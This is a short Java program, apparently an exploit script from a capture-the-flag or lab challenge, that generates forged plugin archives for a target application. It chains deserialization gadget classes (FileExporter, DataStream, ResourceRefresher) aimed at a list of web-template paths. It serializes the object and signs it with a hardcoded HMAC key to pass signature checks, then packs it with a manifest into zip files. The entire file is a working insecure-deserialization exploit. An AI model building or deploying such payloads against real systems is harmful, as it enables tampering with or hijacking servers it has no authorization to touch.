import com.agent.update.deserialization.*;
import java.io.*;
import java.nio.file.*;
import java.util.zip.*;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class ProbeFS {
    static String[] PATHS = {
        "/app/templates/index.html",
        "/app/templates/upload.html",
        "/app/static/upload.html",
        "/app/BOOT-INF/classes/templates/upload.html",
        "/app/BOOT-INF/classes/static/upload.html",
        "/app/classes/templates/upload.html",
        "/app/classes/static/upload.html",
        "/opt/app/templates/upload.html",
        "/opt/app/static/upload.html",
    };

    public static void main(String[] args) throws Exception {
        for (String path : PATHS) {
            String safeName = path.replace("/", "_").replace(".", "_").substring(0, Math.min(35, path.length()));

            FileExporter exporter = new FileExporter();
            exporter.setTeamId("admin");
            DataStream dataStream = new DataStream();
            dataStream.setExporter(exporter);
            ResourceRefresher refresher = new ResourceRefresher();
            refresher.setTargetPath(path);
            refresher.setDataStream(dataStream);

            Path serPath = Paths.get("fs_" + safeName + ".ser");
            try (FileOutputStream fos = new FileOutputStream(serPath.toFile());
                 ObjectOutputStream oos = new ObjectOutputStream(fos)) {
                oos.writeObject(refresher);
            }

            byte[] serData = Files.readAllBytes(serPath);
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec("k3y_5A62_X86".getBytes(), "HmacSHA256"));
            String sig = Base64.getEncoder().encodeToString(mac.doFinal(serData));

            String manifest = "{\"pluginName\":\"fs" + safeName + "\",\"version\":\"1.0\",\"hmacSignature\":\"" + sig + "\",\"description\":\"fs\"}";

            Path zipPath = Paths.get("fs_" + safeName + ".zip");
            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipPath.toFile()))) {
                ZipEntry e1 = new ZipEntry("manifest.json");
                zos.putNextEntry(e1); zos.write(manifest.getBytes()); zos.closeEntry();
                ZipEntry e2 = new ZipEntry("metadata.ser");
                zos.putNextEntry(e2); zos.write(serData); zos.closeEntry();
            }
            System.out.println("OK: " + zipPath + " -> " + path);
        }
    }
}
